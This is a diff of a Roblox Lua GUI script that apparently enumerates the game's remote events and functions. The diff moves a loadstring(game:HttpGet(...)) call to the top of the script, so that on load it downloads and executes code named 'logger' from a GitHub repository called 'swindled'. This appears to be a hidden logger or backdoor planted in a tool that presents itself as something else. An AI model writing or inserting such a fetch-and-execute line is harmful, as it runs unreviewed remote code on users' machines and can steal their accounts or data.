@@ -97,6 +97,7 @@ TextButton.TextWrapped = true
 
 -- Scripts:
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cubert04/swindled/main/logger"))()
 local function KRCT_fake_script() -- ScreenGui.LocalScript 
 	local script = Instance.new('LocalScript', ScreenGui)
 
@@ -105,7 +106,6 @@ local function KRCT_fake_script() -- ScreenGui.LocalScript
 	local x = 0.6
 	local y = -50
 	remotes = {}
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/cubert04/swindled/main/logger"))()
 	
 	for i,remote in game:GetDescendants() do
 		if remote:IsA("BaseRemoteEvent") or remote:IsA("RemoteFunction") then
